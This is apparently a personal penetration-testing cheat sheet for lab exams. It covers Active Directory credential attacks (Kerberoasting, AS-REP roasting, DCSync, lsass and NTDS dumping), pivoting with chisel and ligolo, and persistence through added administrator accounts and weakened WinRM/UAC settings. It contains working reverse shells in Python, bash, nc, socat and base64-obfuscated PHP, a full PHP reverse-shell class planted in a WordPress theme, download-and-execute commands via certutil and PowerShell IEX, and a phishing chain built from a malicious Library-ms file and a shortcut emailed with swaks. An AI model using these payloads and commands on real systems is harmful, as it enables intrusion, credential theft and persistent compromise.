```bash
sudo responder -I tun0
```

## NTLMtheft

```jsx
python3 ntlm_theft.py -g lnk -s 192.168.45.160 -f vault
upload vault and then
impacket-smbserver test . -smb2support

```

## Enum4linux

```
enum4linux -a $target
```

## ASEP-ROASTING

```
impacket-GetNPUsers vulnnet-rst.local/ -dc-ip $target -usersfile usernames.txt -format john -outputfile hashes.txt

john hashes.txt
```

or with **netexec**

```
netexec ldap $target -u 'users2' -p '' -k --dns-server $target
netexec ldap $target -u 'users2' -p '' -k --asreproast asrep.txt or --asrep hash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt --format=krb5asrep
```

## Kerberoasting

```
impacket-GetUserSPNs -dc-ip $target 'vulnet-rst.local/t-skid:tj072889=' -request
â””â”€$ john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

hashcat -m 13100

timedatectl set-ntp off
rdate -n $target

or use --kerberoast

impacket-getTGT 'pirate.htb/MS01$:ms01' -dc-ip ipaddr
```

if no creds and direct rce

```jsx
certutil -urlcache -split -f http://192.168.x.x/Get-SPN.ps1
powershell -ExecutionPolicy Bypass

.\Get-SPN.ps1

Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'

**now we can kerberoast**

powershell iwr http://192.168.45.177/Invoke-Kerberoast.ps1 -outfile Invoke-Kerberoast.ps1

.\Invoke-Kerberoast.ps1

or Rubeus

.\\Rubeus.exe kerberoast /outfile:kerberoast.hashes

```

## Kerbrute username eval

```
/home/kali/Desktop/Boxes/Administrator/kerbrute userenum --dc 10.129.16.174 -d manager.htb users2.txt
```

## Targeted Kerberoasting

```
source venv/bin/activate
uv add --script targetedKerberoast.py -r requirements.txt
sudo ntpdate administrator.htb
uv run targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb

or

**python targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb**
```

## DNSrecon

```
dnsrecon -d 'EGOTISTICAL_BANK.LOCAL' -n $target
```

## RID brute / Username Enum

```
git clone <https://github.com/mohinparamasivam/AD-Username-Generator>

python3 [username-generate.py](<http://username-generate.py>) -u user -o generated.txt
```

```
crackmapexec smb $target -u enterprise-core-vn -p 'lalala' --rid-brute
**try --users asw**
try over different service like ldap asw or wmi or winrm  , rdp
guess GUEST

netexec ldap $target -u lparker -p 'password' --users
```

one liner for pasting

```
netexec ldap $target -u '' -p '' --users |  '{print$ 5}' | fgrep -v '[*]' | tee users2

netexec smb blackfield.local -u 'guest' -p '' --rid-brute | grep "SidTypeUser" | awk -F'\\\\\\\\' '{print $2}' | awk '{print $1}' > users.txt
```

## PSEXEC / WMIEEXEC / PASSTHEHASH

```
rlwrap impacket-psexec vulnnet-rst.local/a-whitehat:bNdKVKjv@$target
rlwrap impacket-wmiexec vulnnet-rst.local/a-whitehat:bnafajfa@$target
rlwrap impacket-psexec egostical-bank.local/administrator@target -hashes :8345adawdac
```

## Secretsdump-DCSYNC

```
impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/whitehat:'akdfjakfaklf'@$target
```

## Checking smb w Creds

```
crackmapexec smb #target -u 'ADministrator' -H or -P
```

## Checking smb Anon

```
netexec smb $target -u -p â€˜â€™
reveals host
crackmapexec smb support.htb --shares
```

## WMI ANON

```
rpcclient -u "" -n $target
enumdom users
```

## Shadow Creds w Certipy â€”> GenericAll

```
certipy-ad shadow auto -u krishna@ignite.local -p Password@1 -account management_svc
-H start with  :NT part

certipy-ad shadow auto \\\\
-u Olivia@administrator.htb \\\\
-p 'ichliebedich' \\\\
-account michael \\\\
-dc-ip 10.129.16.22 \\\\
-target dc.administrator.htb

if clock not synchronized then

rdate -n $target
rerun

if certipy breaks and shows some nbefore error reinstall it

sudo apt remove certipy-ad
pip install --break-system-packages certipy-ad==4.8.2
```

## PGP

```
gpg --decrypt credential.pgp

if u see asc
then gpg2john tryhackme.asc > hash.txt
adn then john  it
```

## Cadaver

```jsx
cadaver http://192.168.45.159
```

# 5. Access and Pivoting

## Check Routing Table

```jsx
route print
```

## Switching Users

Runas

```jsx
. .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.177:443
```

## Discovery

```
route
ip route
```

```
netexec smb 10.0.2.0/24 or ips  --> to discover the ips
fping -qag 192.168.98.0/24 | tee ips
or grab nmap
./nmap -V -sn 10.200.85.0/24 --open

or

cat /proc/net/lib_tne
cat /proc/net/dev
cat /proc/net/arp
```

## Access

### sshuttle

```bash
sshuttle -r user@IP 10.129.4.0/24|
```

### chisel

```
./chisel server -p 8000 --reverse
./chisel client <ATTACKER_IP>:8000 R:3306:127.0.0.1:3306
./chisel client 10.10.14.66:8000 R:3306:127.0.0.1:3306

or

chisel server -p 8081 --reverse || chisel server -p 8081 --reverse --socks5
./chisel client 10.10.10.10:8081 R:socks || ./chisel client 10.10.10.10:8081 R:socks**5**
make sure its
gedit /etc/proxychains4.conf
socks5 127.0.0.1 1080

now u can do
proxychains -q <command> || proxychains -q nmap -sT <ipaddr> -p -Pn -v

now over browser
change proxy to socks
1080 localhost Socks5
```

### Ligolo

**Ligolo portforwarding**

```
grab ligolo proxy and agent, proxy on the linux
tar -xvf

now grab windows agent
cd c:\\windows\\tasks
wget agent.exe -o agent.exe

**sudo ./proxy -selfcert**
then connect back from agent
**.\\agent.exe -connect 10.0.0.12:11601 -ignore-cert

listener_add --addr 0.0.0.0:9090 --to 127.0.0.1:8080**
```

**Ligolo Tunneling**

1. **Find the network mask**, for example, if your IP address is `X.X.X.X` and the subnet mask is `Y.Y.Y.Y`, the network will be `X.X.X.X/` followed by the subnet prefix. For instance, with a subnet mask of `255.255.255.0`, the network prefix would be `/24`.
2. **Create the interface** for `ligolo` in my Kali

```bash
sudo ip tuntap add user [kali_user] mode tun ligolo

sudo ip link set ligolo up
```

1. **Enable the proxy server** on the attacker machine

```bash
# The option -selfcert is for not using a certificate (this will make our communications in clear text), we do not need to encrypt them for the exam.
./ligolo_proxy_linux -selfcert
or
./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>
```

1. Download **(bring) the agent** program to the victim (in this example Windows)

```powershell
iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe
```

1. **Start the client**

```powershell
# The port is the default one, we could also change it if needed.
./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
or
./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert
```

1. **Add the route** in the Kali

```bash
# Run this command in other terminal that from the one where ligolo proxy is running
sudo ip route add [internal_submask]/24 dev ligolo

# Verify routing table
ip route list
```

1. **Finish** setting up the tunneling session

```bash
# Run this commands in the ligolo proxy terminal
Â» session
Â» start

# After this the tunneling should be ready, you could perform any command.
```

**Now to Access a port inside one of the machines lets say 192.168.122.121 â€”> 172.16.122.10 ( 127.0.0.1 : 80 )**

When you run `listener_add` in ligolo, it binds to **the agent's localhost** (the machine running `ligolo_agent.exe`), not arbitrary machines in the subnet.

So if your agent is on `172.16.122.10`, this:

```jsx
Run ligolo_agent.exe on each target (172.16.122.10, 172.16.122.11, etc.), then:
bash
Copy

Â» session        # see all sessions
Â» session 1      # select 172.16.122.10
Â» listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp

Â» session 2      # select 172.16.122.11  
Â» listener_add --addr 0.0.0.0:8081 --to 127.0.0.1:80 --tcp

Access:

    172.16.122.10's localhost:80 â†’ http://kali:8080
    172.16.122.11's localhost:80 â†’ http://kali:8081

Option 2: Double Pivot (Agent on .10 reaches .11's localhost)
```

**Another method to access**

We set up ligolo first

```jsx
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert
```

On target 

```jsx
.\agent.exe -connect 192.168.10.10:11601  -ignore-cert
```

add route to the subnet

```jsx
sudo ip route add 10.10.10.0/24 dev ligolo
tunnel_start
```

**Now to access something thats inside the [localhost](http://localhost) of a subnet**

Transfer chisel.exe  to victim and then

```jsx
listen_add -addr 0.0.0.0:8888 --to 127.0.0.1:8000
```

Turn off the firewall

```jsx
netsh advfirewall set allprofiles state off
```

and then run the chisel server on kali

```jsx
chisel server --reverse --port 8000
```

then on the victim

```jsx
.\chisel.exe client 10.10.10.102:8888 R:localhost:127.0.0.1:1433

```

## Sensitive Store / Dumps

### SEBackupPrivilege

```
On kali create a file called viper.dsh

with the content

set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

```
unix2dos viper.dsh

cd c:\\windows\\tasks
```

```
powershell -c iwr -url <http://10.10.10.10/viper.dsh> -o viper.dsh
```

or setup smb share, set it up anwyas

```
impacket-smbserver share ./ -smb2support -user test -pass ''
```

and then

```
diskshadow /s viper.dsh
```

```
robocopy /b x:\\windows\\ntds . ntds.dit
```

```
reg save hklm\\system c:\\windows\\tasks\\system
reg save hklm\\sam c:\\windows\\tasks\\sam
```

```
net use \\\\10.10.10.10.\\share /user:test
copy sam, ntds.dit, system \\\\10.10.10.10\\share
```

and now finally dump it

```
impacket-secretsdump -ntds ntds.dit -system system -sam sam local | tee dmp.txt
```

### netexec - Hashdump - CREDS

```
netexec smb $target -u 'admin' -p 'Password' -M nanodump --> to dump lsass
netexec smb $target -u 'admin' -p 'Password' -M lsassy
netexec smb $target -u 'admin' -p 'Password' --lsa --> LSA creds
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
nxc ldap <ip addr> -u -p --laps   --> LAPS
nxc ldap <ip addr> -u -p -M laps  --> LAPS
netexec smb $target -u 'admin' -p 'Password' --ntds

if creds dont work try --local-auth

if lsa hash then u have to crack it
if ntlm hash then visit ntlm.pw

john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 mscash_hashes
```

### Keepass

```
keepass2john
keepass2john CEH.kdbx > CEH.kdbx.hash
hashcat CEH.kdbx.hash /usr/share/wordlists/rockyou.txt
```

```
strings -e S KeePassDumpFull.dmp | grep -a $(printf "%b" "\\\\xCF\\\\x25\\\\xCF\\\\x25")
go windows and dotnet run the .dmp file

or when only kdbx file is there
use john or hashcat to crack it

keepass2john passcodes.kdbx
hashcat hash.txt /usr/share/wordlists/rockyou.txt --user -m 13400

and then use it with kplci

kpcli --kdb CEH.kdbx
show -f [num]
```

# 6. Shells

## webshell aspx

```jsx
/usr/share/webshells/aspx/cmdasp.aspx
```

## simple cron

```bash
#!/bin/bash

cp /bin/bash /tmp/bash
chmod +s /tmp/bash

then sudo the command 

/tmp/bash -p
```

### postgres revshell

```jsx
https://github.com/squid22/PostgreSQL_RCE
```

### Linux Upgrade

```
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm

echo $SHELL
ps -p $$ -o comm=

stty -a
stty raw -echo;fg â€”> hit enter twice
stty rows
stty cols

cat /etc/shells
python â€”version
then if u have bin/sh
u can do python -c â€˜import pty; pty.spawn(â€/bin/bashâ€)â€™
otherwise
do perl help and if perl is there
perl -e â€˜exec â€œ/bin/bashâ€; â€˜
or ruby: exec â€œ/bin/bashâ€

/bin/bash -i

script /dev/null -c bash
export TERM=xterm
stty rows 40 columns 120
```

### Base64

```bash
base64 -d password.txt
```

### Python reverse shell

```
python -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_HTB_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Bash reverse shell

```
bash -c 'bash -i >& /dev/tcp/YOUR_HTB_IP/4444 0>&1'
```

### NC reverse shell

```
nc YOUR_HTB_IP 4444 -e /bin/bash
mkfifo /tmp/f; nc YOUR_HTB_IP 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
```

### PHP reverse shell

(Full original pentestmonkey code preserved here exactly as you provided.)

```
<?php `echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA0LzQ0NDQgMD4mMSAK|base64 -d |bash`; ?>

?page=phar:///var/www/html/uploads/archive.phar/test.txt
```

## ncat

```jsx
ncat -e /bin/bash 192.168.1.44 1234
```

## BusyBox

```jsx
http://plan.bitforge.lab/www//upload/files/5hjchl/u69.php?cmd=busybox%20nc%20192.168.45.159%203306%20-e%20bash
```

## Socat Upgrade

```jsx
socat file:`tty`,raw,echo=0 tcp-listen:4444 -->attacker

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.227:4444 --> victim
```

## LibreOffice revshell ODT

```jsx
https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc
```

## Upgrade Through Python Server

### **linux**

```jsx
cat <<EOF > rev.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.181/7777 0>&1
EOF 
```

then from the rev shell type

```jsx
bash rev.sh
```

## RCE â†’ Rev shell

```jsx
pyhon3 poc.py <ip> "curl http://<your-ip>/shell.sh -o /tmp/shell.sh"
python3 poc.py <ip> "chmod +x /tmp/shell.sh"
python3 poc.py <ip> "/tmp/shell.sh"
```

### windows

```jsx
certutil -urlcache -split -f [http://192.168.45.159:80/nc.exe](http://192.168.45.159/nc.exe) C:/Users/Public/Documents/nc.exe
```

```jsx
cmd.exe /c C:/Users/Public/Documents/nc.exe -e cmd.exe 192.168.45.159 4444
```

## WordPress

```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.150 LPORT=4444 -f exe -o 64.exe
```

![image.png](image.png)

we can paste this in the theme header

```jsx
<?php
exec("certutil -urlcache -split -f <http://192.168.45.176/64.exe> C:\\\\Windows\\\\Temp\\\\64.exe");
exec("C:\\\\Windows\\\\Temp\\\\64.exe");
?>
```

now visit [http://192.168.208.55/shenzi/themes/twentytwenty/404.php](http://192.168.208.55/shenzi/themes/twentytwenty/404.php)  after editing 404

or

editing the theme header with this

```jsx
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'bash';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.45.159', 4444);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

on clicking update we get a shell lol

# 7. File Transfer

### Transferring with SMB

```
On host
impacket-smbserver share ./ -smb2support -user test -pass ''
on client
net use \\\\10.10.10.10.\\share  /USER:test

copy \\\\10.10.10.10.\\share\\*
```

### Transferring with NC

```
on kali
nc -lvnp 9001 > log.zip

on victim
nc 10.10.14.82 9001 < 2026-2-9.log.zip

do md5sum filenmame bothways to verify content
```

### Transferring with scp

```jsx
scp /path/to/local/file username@remote_host:/path/to/remote/directory
```

# MISC

## Client Side Attacks

### Library

For this attack, we have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.

**Set up WebDAV share on kali** 

```jsx
mkdir /home/kali/beyond/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
```

**Set up Library**

Open visual studio code, create new file on desktop named as config.Library-ms

```jsx
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
**<url>http://192.168.119.5</url>**
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

save it and transfer to /home/kali/beyond

next create a shortcut file on windows, right click on desktop and select New > Shortcut. A victim double clicking the shortcut file will download powercat and create a revshell.

```jsx
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

now transfer the shortcut file into the webdav dir in kali 

now serve powercat via python3 webserv

```jsx
dir containing powercat
python3 -m http.server 8000
```

Now set up netcatlistener

```jsx
nc -nlvp 4444
```

lets create the email now

Now we are ready to build the swaks command to send the emails. We'll
provide **daniela@beyond.com** and **marcus@beyond.com** as recipients
of the email to **-t**, **john@beyond.com** as name on the email
envelope (sender) to **--from**, and the Windows Library file to
**--attach**. Next, we'll enter **--suppress-data** to summarize
information regarding the SMTP transactions. For the email subject and
body, we'll provide **Subject: Staging Script** to **--header** and
**body.txt** to **--body**. In addition, we'll enter the IP address
of MAILSRV1 for **--server**. Finally, we'll add **-ap** to enable
password authentication.

```jsx
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL

```

Now wait.

## Executing phar rev shell

```jsx
?page=phar:///var/www/html/uploads/archive.phar/test.txt
```

## LFI to RCE

```jsx
https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a
```

## Using Arson

```jsx
docker-compose up -d
localhost:80

```

and then visit

[http://localhost](http://localhost/)

```jsx
Option 1: Create a New Scope Target

Best for: Starting fresh reconnaissance on a new target

    Choose Target Type:
        Company: Any asset owned by an organization (e.g., "Google")
        Wildcard: Any subdomain under the root domain (e.g., "*.google.com")
        URL: Specific attack vector targeting a single domain (e.g., "https://hackme.google.com")

    Enter Target Information:
        For Company targets: Enter the company name
        For Wildcard targets: Enter the wildcard domain pattern
        For URL targets: Enter the specific URL

    Begin Reconnaissance:
        The framework will automatically start gathering intelligence about your target
        You can then run individual tools or use the Auto Scan feature

Option 2: Import Existing Scan Data

Best for: Learning from pre-scanned data or resuming previous sessions
Import from File:

    Download a .rs0n file (like those available in the scan data repository)
    Click "Import Scan Data" in the welcome screen
    Select "Upload File" and choose your .rs0n file
    The framework will import all scope targets and associated scan results

Import from URL:

    Click "Import Scan Data" in the welcome screen
    Select "Import from URL"
    Enter the raw GitHub URL of a .rs0n file:

    https://github.com/R-s0n/ars0n-framework-v2-scan-data/raw/refs/heads/main/Grammarly/rs0n-export-2025-07-27T18-19-17.rs0n

    The framework will download and import the data automatically

Option 3: Use Pre-Scanned Data for Learning

Best for: Understanding the bug bounty hunting process without running scans

The Ars0n Framework v2 Scan Data Repository contains real-world scan data that you can import to learn:

    Subdomain Discovery: How various tools find subdomains and assets
    Vulnerability Assessment: Common security issues and how they're identified
    Attack Surface Mapping: Understanding an organization's digital footprint
    Reconnaissance Methodology: The systematic approach to bug bounty huntin
```

## Persistence

Adding our user to work with nxc later on 

```jsx
net user fatcat fatcat1234 /add
net localgroup Administrators fatcat /add
net user fatcat /active:yes
```

Enable **psexec and wmi**

```jsx
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

Enable **evil-winrm**

```jsx
winrm quickconfig -q
winrm set winrm/config/service/auth @{Basic="true"}
winrm set winrm/config/service @{AllowUnencrypted="true"}
netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985
net start winrm

net localgroup "Remote Desktop Users" fatcat /add

```

Access

```jsx
impacket-psexec fatcat:'fatcat1234'@192.168.139.189

impacket-wmiexec fatcat:'fatcat1234'@192.168.139.189
```

# Potatoes

[https://jlajara.gitlab.io/Potatoes_Windows_Privesc](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

## SigmaPotato

```jsx
# Execute a Command
./SigmaPotato.exe <command>

# Establish a PowerShell Reverse Shell
./SigmaPotato.exe --revshell <ip_addr> <port>

# Return Help Information
./SigmaPotato.exe --help
```

## JuicyPotato

```jsx
**msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.45.159 LPORT=1338 -f exe -o shell.exe

.\Juicy.Potato.x86.exe -t * -p .\shellx86.exe -l 1338 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}**

===================================
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

if default doesnt work use a diff one with -c argument at the end

https://github.com/ohpe/juicy-potato/tree/master/CLSID/?source=post_page-----96e74b36375a---------------------------------------

wuauserv is good choice

.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\users\Public\nc.exe -e cmd.exe 192.168.45.154 242" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

```

## GodPotato

```jsx
\godpotato.exe -cmd â€œnc.exe -e cmd 192.168.45.239 1338â€
```

Add our user

```jsx
GodPotato.exe -cmd "cmd /c net user dave4 fatcat1234 /add"
GodPotato.exe -cmd "cmd /c net localgroup Administrators fatcat /add"

net user fatcat /active:yes
```

Enable psexec and wmi by disabling the UAC

```jsx
GodPotato.exe -cmd "cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

and then get in

```jsx
impacket-psexec dave4:'lab12345678$'@192.168.139.189

impacket-wmiexec dave4:'lab12345678$'@192.168.139.189
```

for winrm

```jsx
winrm quickconfig -q
winrm set winrm/config/service/auth @{Basic="true"}
winrm set winrm/config/service @{AllowUnencrypted="true"}
netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985
net start winrm

```

login

```jsx
evil-winrm -i 192.168.139.189 -u dave4 -p 'lab12345678$'

```
